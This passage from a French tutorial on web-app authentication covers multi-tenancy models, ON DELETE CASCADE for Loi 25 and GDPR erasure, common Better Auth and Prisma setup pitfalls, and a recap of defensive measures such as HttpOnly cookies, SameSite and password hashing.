### Multi-tenancy : un pattern, plusieurs variantes

L'isolation par propriétaire est une forme simple de **multi-tenancy** (multi-locataires). Variantes possibles :

| Modèle | Description | Quand |
|---|---|---|
| **Isolation par utilisateur** (nous) | Chaque ligne a un `userId` | Apps grand public, freemium |
| **Isolation par organisation** | Chaque ligne a un `organizationId`, les users sont rattachés à une org | SaaS B2B |
| **Schema séparé** | Chaque tenant a son propre schéma Postgres | Très grande clients, isolation forte |
| **Base séparée** | Chaque tenant a sa propre base | Conformité HIPAA, données ultra-sensibles |

On peut combiner : `{ organizationId, ownerId }` permet « visible par tous dans l'organisation, modifiable seulement par le propriétaire ».

---

## 13. ON DELETE CASCADE

### Le problème : que se passe-t-il quand on supprime un utilisateur

Quand Alice exerce son **droit à l'effacement** (Loi 25 au Québec, RGPD en Europe), on doit supprimer **toutes** ses données. Pas juste sa ligne `User`. Aussi :
- Ses sessions actives
- Ses comptes (`Account`) liés
- Ses documents
- Tout ce qui pointe vers son `userId`

Sans cascade, il faudrait écrire :

```sql
DELETE FROM "Document" WHERE "userId" = ?;
DELETE FROM session    WHERE "userId" = ?;
DELETE FROM account    WHERE "userId" = ?;
DELETE FROM "user"     WHERE id = ?;
```

Quatre requêtes, dans le bon ordre, sans en oublier une. Source d'erreur.

### La solution : `onDelete: Cascade`

```prisma
model Session {
  ...
  userId String
  user   User @relation(fields: [userId], references: [id], onDelete: Cascade)
}
```

Ce qui se traduit en SQL :

```sql
ALTER TABLE session ADD CONSTRAINT session_userId_fkey
  FOREIGN KEY (userId) REFERENCES "user"(id)
  ON DELETE CASCADE;
```

**Conséquence** : `DELETE FROM "user" WHERE id = ?` déclenche automatiquement la suppression de toutes les lignes filles. Postgres garantit l'atomicité (tout ou rien, dans une transaction implicite).

### Les niveaux de cascade

| Option | Comportement |
|---|---|
| `Cascade` (notre choix) | Supprime aussi les lignes filles |
| `Restrict` | Refuse la suppression du parent s'il a des lignes filles |
| `SetNull` | Met la FK à null sur les lignes filles |
| `SetDefault` | Remplace par la valeur par défaut |
| `NoAction` | Comme Restrict mais peut être différé dans une transaction |

Pour l'authentification, `Cascade` est le bon choix : un utilisateur supprimé doit l'être entièrement.

### Le lien avec la Loi 25

La **Loi modernisant des dispositions législatives en matière de protection des renseignements personnels** (« Loi 25 » au Québec) impose plusieurs obligations applicables ici :

- Possibilité pour la personne de demander l'**effacement** de ses renseignements
- **Limitation de conservation** : ne pas garder les données plus longtemps que nécessaire
- **Sécurité** des données (chiffrement, contrôle d'accès)

Le `ON DELETE CASCADE` est une **mesure technique** qui rend l'effacement complet **simple et fiable**. Une opération en une commande SQL plutôt qu'un script de purge dont on ne sait jamais s'il a tout effacé.

> **Réflexe** : avant tout déploiement en production, vérifier que la suppression d'un compte efface effectivement **toutes** les données rattachées. Le test simple : `DELETE FROM "user" WHERE id = ?` puis `SELECT COUNT(*) FROM <toutes les tables avec userId>` — doit afficher zéro partout.

---

## 14. Les pièges

### 14.1 — `@better-auth/cli` obsolète

**Symptôme** : `SyntaxError: The requested module 'better-call' does not provide an export named 'kAPIErrorHeaderSymbol'`

**Cause profonde** : Better Auth a renommé sa CLI entre la 1.4 et la 1.5. L'ancien paquet `@better-auth/cli` (mars 2026) référence un export interne qui n'existe plus dans `better-call` (dépendance transitive).

**Solution** : utiliser `pnpm dlx auth@latest generate`. Le nouveau paquet s'appelle simplement `auth` et est synchronisé avec Better Auth.

**Leçon générale** : quand une CLI tierce plante avec une erreur d'import bizarre, vérifier si elle a été renommée/dépréciée. C'est plus fréquent qu'on ne croit.

### 14.2 — Import relatif dans `lib/auth.ts`

**Symptôme** : la CLI Better Auth (`pnpm dlx auth@latest generate`) n'arrive pas à charger `lib/auth.ts`.

**Cause profonde** : la CLI s'exécute dans un environnement Node isolé qui **ne résout pas** les alias TypeScript (`@/lib/prisma`). Elle s'attend à du chemin Node standard.

**Solution** : dans `lib/auth.ts` uniquement, utiliser l'import relatif `./prisma`. Pour le reste de l'app, les alias `@/...` continuent de fonctionner — c'est juste cette CLI qui est limitée.

**Leçon générale** : les outils qui parsent du code TS sans passer par le compilateur TS de l'app ont souvent des limitations. Quand un fichier doit être lu à la fois par l'app et par un outil externe, écrire en imports portables.

### 14.3 — `Model user does not exist`

**Symptôme** : à l'inscription via curl ou UI, le serveur retourne 500 avec « Model user does not exist in the database ».

**Cause profonde** : le serveur `pnpm dev` a démarré **avant** la migration Prisma. Le client TypeScript en mémoire n'a pas les modèles `User/Session/Account/Verification`.

**Solution** :
```bash
# Ctrl+C dans le terminal pnpm dev
pnpm prisma generate
pnpm dev
```

**Leçon générale** : après **chaque** `prisma migrate dev`, redémarrer le serveur dev. Webpack ne détecte pas le changement de client Prisma tout seul.

### 14.4 — Erreur TypeScript résiduelle dans VS Code

**Symptôme** : après migration, VS Code affiche `Property 'userId' does not exist in type 'DocumentWhereInput'` alors que `prisma generate` est passé sans erreur.

**Cause profonde** : VS Code maintient son propre serveur TypeScript en mémoire, qui a mis en cache l'ancien client Prisma. Il ne lit pas automatiquement le nouveau.

**Solution** : `Cmd+Shift+P` → `TypeScript: Restart TS Server`. Si ça ne suffit pas : `pnpm prisma generate` puis re-restart.

**Leçon générale** : VS Code n'invalide pas son cache TypeScript sur les fichiers `.d.ts` générés. Apprendre le raccourci Restart TS Server est un réflexe à avoir dès qu'une erreur de typage semble incohérente avec la réalité.

### 14.5 — Cookie de session absent après inscription

**Symptôme** : `signUp.email` retourne success, mais `useSession()` reste null et la barre supérieure n'affiche pas l'utilisateur.

**Cause profonde** : on a oublié `router.refresh()` après `router.push("/")`. Next.js ne re-rend pas les server components, donc l'état de session côté serveur n'est pas relu.

**Solution** :
```typescript
router.push("/");
router.refresh();
```

**Leçon générale** : `router.push` change l'URL sans toucher aux server components. Pour forcer un re-rendu serveur après un événement d'auth, **toujours** ajouter `router.refresh()`.

### 14.6 — `process.env.X!` silencieux qui plante au runtime

**Symptôme** : en production, la première tentative OAuth échoue avec une erreur cryptique de Better Auth.

**Cause profonde** : `GITHUB_CLIENT_SECRET` n'a pas été ajouté aux variables d'environnement de production. `process.env.GITHUB_CLIENT_SECRET!` vaut `undefined`, et le `!` ment à TypeScript.

**Solution préventive** : valider les variables d'environnement **au démarrage** avec Zod :
```typescript
const env = z.object({
  GITHUB_CLIENT_ID: z.string().min(1),
  GITHUB_CLIENT_SECRET: z.string().min(1),
  // ...
}).parse(process.env);
```

L'app plante au démarrage si une variable manque, avec un message clair.

**Leçon générale** : le `!` est un mensonge qui marche **jusqu'à** ce qu'il ne marche plus. Pour les secrets critiques, valider explicitement.

### 14.7 — OAuth callback URL incorrect

**Symptôme** : le clic sur « Continuer avec GitHub » mène à une erreur GitHub « redirect_uri_mismatch ».

**Cause profonde** : l'URL déclarée dans GitHub OAuth App ne correspond pas exactement à celle que Better Auth utilise. Cas typiques :
- `http` vs `https`
- `localhost:3000` vs `127.0.0.1:3000`
- `/api/auth/callback/github` vs `/api/auth/github/callback`
- Slash final ou pas

**Solution** : Better Auth utilise **toujours** `<BETTER_AUTH_URL>/api/auth/callback/<provider>`. Copier-coller cette URL exactement dans la config GitHub/Google.

**Leçon générale** : OAuth est strict sur l'exactitude de l'URL — c'est délibéré (anti-attaque). Toujours copier-coller, jamais retaper.

### 14.8 — Vider la table avant migration NOT NULL

**Symptôme** : `pnpm prisma migrate dev` refuse de générer la migration parce qu'on ajoute une colonne `NOT NULL` sans valeur par défaut à une table non vide.

**Cause profonde** : Postgres ne peut pas attribuer une valeur à une colonne `NOT NULL` pour les lignes existantes. Prisma refuse plutôt que de planter à mi-migration.

**Solution** : soit ajouter un `@default(...)`, soit (notre choix en 3E.1) vider la table avant la migration :
```bash
psql hackathon_lab -c 'DELETE FROM "Document";'
```

**Leçon générale** : ajouter une colonne obligatoire à une table existante est une **opération non triviale**. En production, c'est typiquement une migration en plusieurs étapes : (1) ajouter la colonne nullable, (2) backfill, (3) basculer à NOT NULL.

### 14.9 — Restart TS Server obligatoire après régénération Prisma

**Symptôme** : changements dans `schema.prisma` répercutés en base, mais TypeScript continue à râler avec les anciens types.

**Cause profonde** : voir 14.4. C'est le même piège que `Restart TS Server`, mais ça revient si souvent qu'il mérite son propre encadré.

**Solution** : raccourci VS Code à mémoriser — `Cmd+Shift+P` → `TypeScript: Restart TS Server`.

---

## Conclusion : ce qu'on a vraiment construit

À la fin de la Phase 3, l'application combine plusieurs mécanismes de sécurité standards :

1. **Authentification multi-méthodes** : email/password (avec scrypt + sel) + OAuth (GitHub, Google)
2. **Sessions stateful** : révocables, traçables, expirant à 7 jours
3. **Cookies durcis** : HttpOnly (anti-XSS) + SameSite=Lax (anti-CSRF) + signature HMAC (anti-forgerie)
4. **Procédures tRPC protégées par défaut** : `protectedProcedure` comme garde-fou
5. **Isolation par propriétaire** : filtre `userId` côté lecture, écrasement `userId` côté écriture
6. **Suppression en cascade** : conformité à la Loi 25 en une commande SQL

Chacun de ces mécanismes répond à une **classe d'attaque connue**. Aucun n'est gratuit : chacun a une raison documentée, et chacun aurait un défaut visible s'il manquait.

### La leçon transversale

L'authentification, contrairement à la plupart des sujets logiciels, est un domaine où **« ça marche en dev »** ne dit **rien** sur la sécurité en prod. Une app sans HttpOnly « marche » — jusqu'au premier XSS. Une app sans SameSite « marche » — jusqu'à la première attaque CSRF ciblée. Une app sans hachage « marche » — jusqu'à la première fuite de base.

> Le rôle d'une bibliothèque comme Better Auth est précisément de **fermer ces failles par défaut**, avant qu'elles deviennent visibles.

### Indicateur de maîtrise

À la fin de cette lecture, on devrait pouvoir répondre aux questions suivantes sans hésitation :

1. Pourquoi a-t-on **deux** tables `User` et `Account` au lieu d'une ?
2. Que se passe-t-il si on enlève `HttpOnly` du cookie de session ?
3. Pourquoi scrypt est-il volontairement lent ?
4. À quoi sert le `state` dans le flux OAuth ?
5. Pourquoi forcer `userId` côté serveur même si le schéma Zod le rejette ?
6. Quel SQL est généré par `onDelete: Cascade` ?
7. Pourquoi `router.refresh()` après `router.push()` ?

Si l'une de ces questions reste floue, retourner à la section correspondante.

**Prochaine étape** : Phase 4 — première verticale IA complète. L'authentification devient l'**infrastructure invisible** qui sécurise tout ce qui arrive ensuite.
